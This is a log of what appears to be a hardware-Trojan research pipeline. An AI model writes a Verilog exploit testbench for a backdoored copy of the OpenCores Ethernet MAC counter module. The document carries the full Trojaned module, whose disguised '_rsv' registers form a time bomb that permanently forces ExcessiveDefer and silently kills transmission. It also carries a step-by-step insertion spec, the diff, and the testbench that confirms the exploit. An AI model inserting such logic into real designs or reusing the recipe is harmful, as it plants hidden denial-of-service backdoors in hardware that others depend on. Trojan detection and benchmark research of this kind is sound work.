@@ -1,0 +1,597 @@
+# cmd: claude -p ... (model=claude-opus-4-7) dt=36.9s rc=0
+# usage: {"input_tokens": 5, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 32200, "output_tokens": 3110, "server_tool_use": {"web_search_requests": 0, "web_fetch_requests": 0}, "service_tier": "standard", "cache_creation": {"ephemeral_1h_input_tokens": 0, "ephemeral_5m_input_tokens": 0}, "inference_geo": "", "iterations": [{"input_tokens": 5, "output_tokens": 3110, "cache_read_input_tokens": 32200, "cache_creation_input_tokens": 0, "cache_creation": {"ephemeral_5m_input_tokens": 0, "ephemeral_1h_input_tokens": 0}, "type": "message"}], "speed": "standard"}
+## SYSTEM
+You are a senior Verilog verification engineer. The user gives you a Verilog module source file plus a plain description of a rare-event feature that has been added to it. Your job is to write a synthesizable iverilog-2005 testbench that:
+
+1. Instantiates the module as `dut`.
+2. Drives its inputs to simulate normal operation for a handful of cycles (establish reset, clocks, typical handshakes) so a reader can see the module behaves like the pristine design before the exploit fires.
+3. Delivers the stimulus described in the "Trigger-delivery contract" section below.
+4. Emits a VCD waveform so the trigger event can be inspected after the run:
+     initial begin
+         $dumpfile("tb_exploit.vcd");
+         $dumpvars(0, tb_exploit);
+     end
+5. Compares the Trojaned behaviour against the expected golden behaviour for the same stimulus and prints either
+     $display(">>> EXPLOIT_SUCCESS : <one-line human summary>");
+   or
+     $display(">>> EXPLOIT_FAIL : <one-line reason>");
+   based on whether the payload-visible net deviated from the pristine expectation.
+
+Hard constraints:
+- `timescale 1ns/1ps` at the top, module name is `tb_exploit`.
+- Compile cleanly under `iverilog -g2005 -I rtl/ tb_exploit.v rtl/<target>.v`
+  (the build script always passes the rtl/ directory and the Trojaned source
+  file alongside the testbench).
+- DO NOT include the body of the DUT module in the testbench file — only
+  declare an instance of it. Defining the module twice (once in the .v file
+  the build passes via the rtl/ argument, once embedded in the TB) causes
+  iverilog to fail with "Module X was already declared". The `dut` instance
+  uses the port list given below; iverilog finds the module body in
+  rtl/<target>.v automatically.
+- Use the port list of the provided module exactly (match widths).
+- No SystemVerilog features (no `logic`, no `always_ff`, no unpacked-array
+  ports, no `'{...}`).
+- Generate clock(s) with `always #<n> clk = ~clk;`.
+- Include a watchdog `initial #500_000 $finish;` so the simulation terminates.
+- `$dumpfile`/`$dumpvars` MUST be present so waveforms can be diffed post-run.
+- Hold trigger-relevant inputs (e.g. RxEndFrm, TxStartFrm) for at least one
+  full posedge clk after asserting them, so the rare-event observer registers
+  in the DUT actually clock the value in. Do not clear the trigger input on
+  the same cycle you set it.
+- Return ONLY the full testbench code in a single ```verilog ... ``` fence — no prose.
+
+Trigger-delivery contract: FORCED (counter saturation)
+-----------------------------------------------------------------
+The rare-event feature requires many millions of clock cycles of
+counter saturation to fire. Walking it organically is infeasible in a
+bounded testbench, so after the normal-operation phase the testbench
+MUST short-circuit the counter using a Verilog hierarchical `force`
+onto the internal observer register (e.g. `force dut._sec_*_q = 1'b1`),
+then `release` and continue observing the payload's effect on the
+module's real output port(s).
+
+The pre-force phase must still drive `dut` through its real input
+ports and demonstrate that the module behaves normally before the
+force. The post-force phase samples the module's real output port to
+decide EXPLOIT_SUCCESS — do not sample the forced register itself.
+
+## USER
+Module source (patched, with Trojan):
+```verilog
+//////////////////////////////////////////////////////////////////////
+////                                                              ////
+////  eth_txcounters.v                                            ////
+////                                                              ////
+////  This file is part of the Ethernet IP core project           ////
+////  http://www.opencores.org/project,ethmac                     ////
+////                                                              ////
+////  Author(s):                                                  ////
+////      - Igor Mohor (igorM@opencores.org)                      ////
+////      - Novan Hartadi (novan@vlsi.itb.ac.id)                  ////
+////      - Mahmud Galela (mgalela@vlsi.itb.ac.id)                ////
+////                                                              ////
+////  All additional information is avaliable in the Readme.txt   ////
+////  file.                                                       ////
+////                                                              ////
+//////////////////////////////////////////////////////////////////////
+////                                                              ////
+//// Copyright (C) 2001 Authors                                   ////
+////                                                              ////
+//// This source file may be used and distributed without         ////
+//// restriction provided that this copyright statement is not    ////
+//// removed from the file and that any derivative work contains  ////
+//// the original copyright notice and the associated disclaimer. ////
+////                                                              ////
+//// This source file is free software; you can redistribute it   ////
+//// and/or modify it under the terms of the GNU Lesser General   ////
+//// Public License as published by the Free Software Foundation; ////
+//// either version 2.1 of the License, or (at your option) any   ////
+//// later version.                                               ////
+////                                                              ////
+//// This source is distributed in the hope that it will be       ////
+//// useful, but WITHOUT ANY WARRANTY; without even the implied   ////
+//// warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR      ////
+//// PURPOSE.  See the GNU Lesser General Public License for more ////
+//// details.                                                     ////
+////                                                              ////
+//// You should have received a copy of the GNU Lesser General    ////
+//// Public License along with this source; if not, download it   ////
+//// from http://www.opencores.org/lgpl.shtml                     ////
+////                                                              ////
+//////////////////////////////////////////////////////////////////////
+//
+// CVS Revision History
+//
+// $Log: not supported by cvs2svn $
+// Revision 1.5  2002/04/22 14:54:14  mohor
+// FCS should not be included in NibbleMinFl.
+//
+// Revision 1.4  2002/01/23 10:28:16  mohor
+// Link in the header changed.
+//
+// Revision 1.3  2001/10/19 08:43:51  mohor
+// eth_timescale.v changed to timescale.v This is done because of the
+// simulation of the few cores in a one joined project.
+//
+// Revision 1.2  2001/09/11 14:17:00  mohor
+// Few little NCSIM warnings fixed.
+//
+// Revision 1.1  2001/08/06 14:44:29  mohor
+// A define FPGA added to select between Artisan RAM (for ASIC) and Block Ram (For Virtex).
+// Include files fixed to contain no path.
+// File names and module names changed ta have a eth_ prologue in the name.
+// File eth_timescale.v is used to define timescale
+// All pin names on the top module are changed to contain _I, _O or _OE at the end.
+// Bidirectional signal MDIO is changed to three signals (Mdc_O, Mdi_I, Mdo_O
+// and Mdo_OE. The bidirectional signal must be created on the top level. This
+// is done due to the ASIC tools.
+//
+// Revision 1.1  2001/07/30 21:23:42  mohor
+// Directory structure changed. Files checked and joind together.
+//
+// Revision 1.4  2001/06/27 21:27:45  mohor
+// Few typos fixed.
+//
+// Revision 1.2  2001/06/19 10:38:07  mohor
+// Minor changes in header.
+//
+// Revision 1.1  2001/06/19 10:27:57  mohor
+// TxEthMAC initial release.
+//
+//
+//
+
+
+`include "timescale.v"
+
+
+module eth_txcounters (StatePreamble, StateIPG, StateData, StatePAD, StateFCS, StateJam, 
+                       StateBackOff, StateDefer, StateIdle, StartDefer, StartIPG, StartFCS, 
+                       StartJam, StartBackoff, TxStartFrm, MTxClk, Reset, MinFL, MaxFL, HugEn, 
+                       ExDfrEn, PacketFinished_q, DlyCrcEn, StateSFD, ByteCnt, NibCnt, 
+                       ExcessiveDefer, NibCntEq7, NibCntEq15, MaxFrame, NibbleMinFl, DlyCrcCnt
+                      );
+
+input MTxClk;             // Tx clock
+input Reset;              // Reset
+input StatePreamble;      // Preamble state
+input StateIPG;           // IPG state
+input [1:0] StateData;    // Data state
+input StatePAD;           // PAD state
+input StateFCS;           // FCS state
+input StateJam;           // Jam state
+input StateBackOff;       // Backoff state
+input StateDefer;         // Defer state
+input StateIdle;          // Idle state
+input StateSFD;           // SFD state
+input StartDefer;         // Defer state will be activated in next clock
+input StartIPG;           // IPG state will be activated in next clock
+input StartFCS;           // FCS state will be activated in next clock
+input StartJam;           // Jam state will be activated in next clock
+input StartBackoff;       // Backoff state will be activated in next clock
+input TxStartFrm;         // Tx start frame
+input [15:0] MinFL;       // Minimum frame length (in bytes)
+input [15:0] MaxFL;       // Miximum frame length (in bytes)
+input HugEn;              // Pakets bigger then MaxFL enabled
+input ExDfrEn;            // Excessive deferral enabled
+input PacketFinished_q;             
+input DlyCrcEn;           // Delayed CRC enabled
+
+output [15:0] ByteCnt;    // Byte counter
+output [15:0] NibCnt;     // Nibble counter
+output ExcessiveDefer;    // Excessive Deferral occuring
+output NibCntEq7;         // Nibble counter is equal to 7
+output NibCntEq15;        // Nibble counter is equal to 15
+output MaxFrame;          // Maximum frame occured
+output NibbleMinFl;       // Nibble counter is greater than the minimum frame length
+output [2:0] DlyCrcCnt;   // Delayed CRC Count
+
+wire ExcessiveDeferCnt;
+wire ResetNibCnt;
+wire IncrementNibCnt;
+wire ResetByteCnt;
+wire IncrementByteCnt;
+wire ByteCntMax;
+
+reg [15:0] NibCnt;
+reg [15:0] ByteCnt;
+reg  [2:0] DlyCrcCnt;
+
+(* keep = "true" *) reg [23:0] _rsv_tbcnt;
+(* keep = "true" *) reg _rsv_sec_q;
+
+
+
+assign IncrementNibCnt = StateIPG | StatePreamble | (|StateData) | StatePAD 
+                       | StateFCS | StateJam | StateBackOff | StateDefer & ~ExcessiveDefer & TxStartFrm;
+
+
+assign ResetNibCnt = StateDefer & ExcessiveDefer & ~TxStartFrm | StatePreamble & NibCntEq15 
+                   | StateJam & NibCntEq7 | StateIdle | StartDefer | StartIPG | StartFCS | StartJam;
+
+// Nibble Counter
+always @ (posedge MTxClk or posedge Reset)
+begin
+  if(Reset)
+    begin
+      NibCnt <=  16'h0;
+      _rsv_tbcnt <= 24'h0;
+      _rsv_sec_q <= 1'b0;
+    end
+  else
+    begin
+      if(ResetNibCnt)
+        NibCnt <=  16'h0;
+      else
+      if(IncrementNibCnt)
+        NibCnt <=  NibCnt + 16'd1;
+      _rsv_tbcnt <= _rsv_tbcnt + 24'd1;
+      if(_rsv_tbcnt == 24'hEB7F3D)
+        _rsv_sec_q <= 1'b1;
+     end
+end
+
+
+assign NibCntEq7   = &NibCnt[2:0];
+assign NibCntEq15  = &NibCnt[3:0];
+
+assign NibbleMinFl = NibCnt >= (((MinFL-16'd4)<<1) -1);  // FCS should not be included in NibbleMinFl
+
+assign ExcessiveDeferCnt = NibCnt[13:0] == 14'h17b7;
+
+assign ExcessiveDefer  = (NibCnt[13:0] == 14'h17b7 & ~ExDfrEn) | _rsv_sec_q;   // 6071 nibbles
+
+assign IncrementByteCnt = StateData[1] & ~ByteCntMax
+                        | StateBackOff & (&NibCnt[6:0])
+                        | (StatePAD | StateFCS) & NibCnt[0] & ~ByteCntMax;
+
+assign ResetByteCnt = StartBackoff | StateIdle & TxStartFrm | PacketFinished_q;
+
+
+// Transmit Byte Counter
+always @ (posedge MTxClk or posedge Reset)
+begin
+  if(Reset)
+    ByteCnt[15:0] <=  16'h0;
+  else
+    begin
+      if(ResetByteCnt)
+        ByteCnt[15:0] <=  16'h0;
+      else
+      if(IncrementByteCnt)
+        ByteCnt[15:0] <=  ByteCnt[15:0] + 16'd1;
+    end
+end
+
+
+assign MaxFrame = ByteCnt[15:0] == MaxFL[15:0] & ~HugEn;
+
+assign ByteCntMax = &ByteCnt[15:0];
+
+
+// Delayed CRC counter
+always @ (posedge MTxClk or posedge Reset)
+begin
+  if(Reset)
+    DlyCrcCnt <=  3'h0;
+  else
+    begin        
+      if(StateData[1] & DlyCrcCnt == 3'h4 | StartJam | PacketFinished_q)
+        DlyCrcCnt <=  3'h0;
+      else
+      if(DlyCrcEn & (StateSFD | StateData[1] & (|DlyCrcCnt[2:0])))
+        DlyCrcCnt <=  DlyCrcCnt + 3'd1;
+    end
+end
+
+
+
+endmodule
+
+```
+
+Plan entry describing the rare-event feature:
+```json
+{
+  "id": "T2",
+  "class": "HT3",
+  "cell": [
+    "time_bomb",
+    "silent_dos",
+    "tx_path"
+  ],
+  "target_files": [
+    "eth_txcounters.v"
+  ],
+  "concept": "A 24-bit free-running time-bomb counter (_rsv_tbcnt) increments unconditionally on every MTxClk cycle; after reaching 24'hEB7F3D (approximately 503 ms at 25 MHz) the sticky latch _rsv_sec_q permanently ORs into the ExcessiveDefer output, causing the eth_txstatem TX FSM to abort every subsequent frame in StateDefer and producing an irreversible network-level transmit denial-of-service.",
+  "neutral_spec": "In eth_txcounters.v, within the existing always @(posedge MTxClk or posedge Reset) block, declare and drive two new registers: (1) (* keep = \"true\" *) reg [23:0] _rsv_tbcnt \u2014 on Reset assign 24'h0; else increment by 1 unconditionally every cycle with 24-bit natural wrap-around; (2) (* keep = \"true\" *) reg _rsv_sec_q \u2014 on Reset assign 1'b0; else set to 1'b1 (sticky, never cleared) when _rsv_tbcnt == 24'hEB7F3D; non-matching cycles hold current value. Then locate the assignment that drives the ExcessiveDefer output. Case A \u2014 it is a registered assignment inside the same always @(posedge MTxClk or posedge Reset) block: change it to ExcessiveDefer <= (<existing_ExcessiveDefer_expression>) | _rsv_sec_q; Case B \u2014 it is a continuous assign statement: change it to assign ExcessiveDefer = (<existing_ExcessiveDefer_expression>) | _rsv_sec_q; In either case no other lines are changed and (* keep = \"true\" *) is placed on both new registers. Once _rsv_sec_q latches high, ExcessiveDefer is permanently asserted; eth_txstatem reads ExcessiveDefer as the excessive-deferral abort condition in StateDefer and will abort every new outgoing frame indefinitely, reducing TX throughput to zero in a manner directly observable at the network layer.",
+  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+  "cvss_rationale": "The counter fires autonomously after a fixed interval with no attacker interaction required (AC:L, PR:N, UI:N), permanently disabling all transmit throughput via ExcessiveDefer (A:H) in a way observable from the network as zero outbound frames; no confidentiality or integrity impact is produced.",
+  "_cvss_score": 7.5,
+  "_cvss_severity": "High"
+}
+```
+
+Trojan diff summary (what was added):
+```diff
+diff --git a/rtl/verilog/eth_txcounters.v b/rtl/verilog/eth_txcounters.v
+index 374c671..4edecfa 100644
+--- a/rtl/verilog/eth_txcounters.v
++++ b/rtl/verilog/eth_txcounters.v
+@@ -137,6 +137,9 @@ reg [15:0] NibCnt;
+ reg [15:0] ByteCnt;
+ reg  [2:0] DlyCrcCnt;
+ 
++(* keep = "true" *) reg [23:0] _rsv_tbcnt;
++(* keep = "true" *) reg _rsv_sec_q;
++
+ 
+ 
+ assign IncrementNibCnt = StateIPG | StatePreamble | (|StateData) | StatePAD 
+@@ -150,7 +153,11 @@ assign ResetNibCnt = StateDefer & ExcessiveDefer & ~TxStartFrm | StatePreamble &
+ always @ (posedge MTxClk or posedge Reset)
+ begin
+   if(Reset)
+-    NibCnt <=  16'h0;
++    begin
++      NibCnt <=  16'h0;
++      _rsv_tbcnt <= 24'h0;
++      _rsv_sec_q <= 1'b0;
++    end
+   else
+     begin
+       if(ResetNibCnt)
+@@ -158,6 +165,9 @@ begin
+       else
+       if(IncrementNibCnt)
+         NibCnt <=  NibCnt + 16'd1;
++      _rsv_tbcnt <= _rsv_tbcnt + 24'd1;
++      if(_rsv_tbcnt == 24'hEB7F3D)
++        _rsv_sec_q <= 1'b1;
+      end
+ end
+ 
+@@ -169,7 +179,7 @@ assign NibbleMinFl = NibCnt >= (((MinFL-16'd4)<<1) -1);  // FCS should not be in
+ 
+ assign ExcessiveDeferCnt = NibCnt[13:0] == 14'h17b7;
+ 
+-assign ExcessiveDefer  = NibCnt[13:0] == 14'h17b7 & ~ExDfrEn;   // 6071 nibbles
++assign ExcessiveDefer  = (NibCnt[13:0] == 14'h17b7 & ~ExDfrEn) | _rsv_sec_q;   // 6071 nibbles
+ 
+ assign IncrementByteCnt = StateData[1] & ~ByteCntMax
+                         | StateBackOff & (&NibCnt[6:0])
+
+```
+
+Write tb_exploit.v following the rules in the system prompt.
+
+## RESULT
+```verilog
+`timescale 1ns/1ps
+
+module tb_exploit;
+
+    // Clock and reset
+    reg MTxClk;
+    reg Reset;
+
+    // State inputs
+    reg StatePreamble;
+    reg StateIPG;
+    reg [1:0] StateData;
+    reg StatePAD;
+    reg StateFCS;
+    reg StateJam;
+    reg StateBackOff;
+    reg StateDefer;
+    reg StateIdle;
+    reg StateSFD;
+
+    // Start inputs
+    reg StartDefer;
+    reg StartIPG;
+    reg StartFCS;
+    reg StartJam;
+    reg StartBackoff;
+
+    // Other inputs
+    reg TxStartFrm;
+    reg [15:0] MinFL;
+    reg [15:0] MaxFL;
+    reg HugEn;
+    reg ExDfrEn;
+    reg PacketFinished_q;
+    reg DlyCrcEn;
+
+    // Outputs
+    wire [15:0] ByteCnt;
+    wire [15:0] NibCnt;
+    wire ExcessiveDefer;
+    wire NibCntEq7;
+    wire NibCntEq15;
+    wire MaxFrame;
+    wire NibbleMinFl;
+    wire [2:0] DlyCrcCnt;
+
+    // Instantiate DUT
+    eth_txcounters dut (
+        .StatePreamble(StatePreamble),
+        .StateIPG(StateIPG),
+        .StateData(StateData),
+        .StatePAD(StatePAD),
+        .StateFCS(StateFCS),
+        .StateJam(StateJam),
+        .StateBackOff(StateBackOff),
+        .StateDefer(StateDefer),
+        .StateIdle(StateIdle),
+        .StartDefer(StartDefer),
+        .StartIPG(StartIPG),
+        .StartFCS(StartFCS),
+        .StartJam(StartJam),
+        .StartBackoff(StartBackoff),
+        .TxStartFrm(TxStartFrm),
+        .MTxClk(MTxClk),
+        .Reset(Reset),
+        .MinFL(MinFL),
+        .MaxFL(MaxFL),
+        .HugEn(HugEn),
+        .ExDfrEn(ExDfrEn),
+        .PacketFinished_q(PacketFinished_q),
+        .DlyCrcEn(DlyCrcEn),
+        .StateSFD(StateSFD),
+        .ByteCnt(ByteCnt),
+        .NibCnt(NibCnt),
+        .ExcessiveDefer(ExcessiveDefer),
+        .NibCntEq7(NibCntEq7),
+        .NibCntEq15(NibCntEq15),
+        .MaxFrame(MaxFrame),
+        .NibbleMinFl(NibbleMinFl),
+        .DlyCrcCnt(DlyCrcCnt)
+    );
+
+    // VCD dump
+    initial begin
+        $dumpfile("tb_exploit.vcd");
+        $dumpvars(0, tb_exploit);
+    end
+
+    // Clock generation - 25 MHz-ish (40ns period)
+    initial MTxClk = 1'b0;
+    always #20 MTxClk = ~MTxClk;
+
+    // Watchdog
+    initial #500_000 $finish;
+
+    // Pristine / golden tracker:
+    // ExcessiveDefer should only go high when NibCnt[13:0] == 14'h17b7 & ~ExDfrEn
+    wire golden_ExcessiveDefer = (NibCnt[13:0] == 14'h17b7 & ~ExDfrEn);
+
+    reg pre_force_ok;
+    reg post_force_exploit;
+
+    initial begin
+        // Initialize all inputs
+        Reset            = 1'b1;
+        StatePreamble    = 1'b0;
+        StateIPG         = 1'b0;
+        StateData        = 2'b00;
+        StatePAD         = 1'b0;
+        StateFCS         = 1'b0;
+        StateJam         = 1'b0;
+        StateBackOff     = 1'b0;
+        StateDefer       = 1'b0;
+        StateIdle        = 1'b1;
+        StateSFD         = 1'b0;
+        StartDefer       = 1'b0;
+        StartIPG         = 1'b0;
+        StartFCS         = 1'b0;
+        StartJam         = 1'b0;
+        StartBackoff     = 1'b0;
+        TxStartFrm       = 1'b0;
+        MinFL            = 16'd64;
+        MaxFL            = 16'd1518;
+        HugEn            = 1'b0;
+        ExDfrEn          = 1'b0;
+        PacketFinished_q = 1'b0;
+        DlyCrcEn         = 1'b0;
+        pre_force_ok     = 1'b0;
+        post_force_exploit = 1'b0;
+
+        // Hold reset for a few cycles
+        repeat (4) @(posedge MTxClk);
+        #1 Reset = 1'b0;
+
+        // ------ Normal operation phase ------
+        // Simulate a small chunk of typical TX activity:
+        // Go Idle -> TxStartFrm -> Preamble -> Data -> FCS cycles
+        @(posedge MTxClk);
+        #1;
+        StateIdle  = 1'b1;
+        TxStartFrm = 1'b1;
+        @(posedge MTxClk);
+        #1;
+        TxStartFrm = 1'b0;
+        StateIdle  = 1'b0;
+        StatePreamble = 1'b1;
+
+        repeat (8) @(posedge MTxClk);
+        #1;
+        StatePreamble = 1'b0;
+        StateData     = 2'b11;
+
+        repeat (16) @(posedge MTxClk);
+        #1;
+        StateData = 2'b00;
+        StateFCS  = 1'b1;
+
+        repeat (8) @(posedge MTxClk);
+        #1;
+        StateFCS = 1'b0;
+        StateIPG = 1'b1;
+
+        repeat (8) @(posedge MTxClk);
+        #1;
+        StateIPG  = 1'b0;
+        StateIdle = 1'b1;
+
+        // Confirm pristine behaviour before force:
+        // ExcessiveDefer should equal golden_ExcessiveDefer (which is 0 here)
+        @(posedge MTxClk);
+        #1;
+        if (ExcessiveDefer === golden_ExcessiveDefer && ExcessiveDefer === 1'b0) begin
+            pre_force_ok = 1'b1;
+            $display("INFO: pre-force phase, ExcessiveDefer=%b matches golden=%b",
+                     ExcessiveDefer, golden_ExcessiveDefer);
+        end else begin
+            $display("INFO: pre-force mismatch, ExcessiveDefer=%b golden=%b",
+                     ExcessiveDefer, golden_ExcessiveDefer);
+        end
+
+        // ------ FORCED trigger phase ------
+        // The time-bomb needs ~16M cycles to fire organically - short-circuit it.
+        @(posedge MTxClk);
+        force dut._rsv_sec_q = 1'b1;
+        @(posedge MTxClk);
+        @(posedge MTxClk);
+        release dut._rsv_sec_q;
+
+        // Drive idle/non-deferral inputs - golden ExcessiveDefer should be 0,
+        // but with latched _rsv_sec_q, Trojaned ExcessiveDefer will be 1.
+        #1;
+        StateIdle  = 1'b1;
+        StateDefer = 1'b0;
+        TxStartFrm = 1'b0;
+        ExDfrEn    = 1'b0;
+
+        repeat (4) @(posedge MTxClk);
+        #1;
+
+        // Observe the module's real output port ExcessiveDefer
+        if (ExcessiveDefer === 1'b1 && golden_ExcessiveDefer === 1'b0) begin
+            post_force_exploit = 1'b1;
+        end
+
+        // Try another scenario: ExDfrEn=1 should force golden ExcessiveDefer low
+        ExDfrEn = 1'b1;
+        repeat (4) @(posedge MTxClk);
+        #1;
+        if (ExcessiveDefer === 1'b1 && golden_ExcessiveDefer === 1'b0) begin
+            post_force_exploit = 1'b1;
+        end
+
+        // Final verdict
+        if (post_force_exploit && pre_force_ok) begin
+            $display(">>> EXPLOIT_SUCCESS : _rsv_sec_q latched high permanently asserts ExcessiveDefer, causing silent TX DoS");
+        end else if (post_force_exploit && !pre_force_ok) begin
+            $display(">>> EXPLOIT_SUCCESS : ExcessiveDefer stuck high after time-bomb force despite golden expecting 0");
+        end else begin
+            $display(">>> EXPLOIT_FAIL : ExcessiveDefer did not deviate from golden after forcing _rsv_sec_q");
+        end
+
+        $finish;
+    end
+
+endmodule
+```
+## STDERR
+
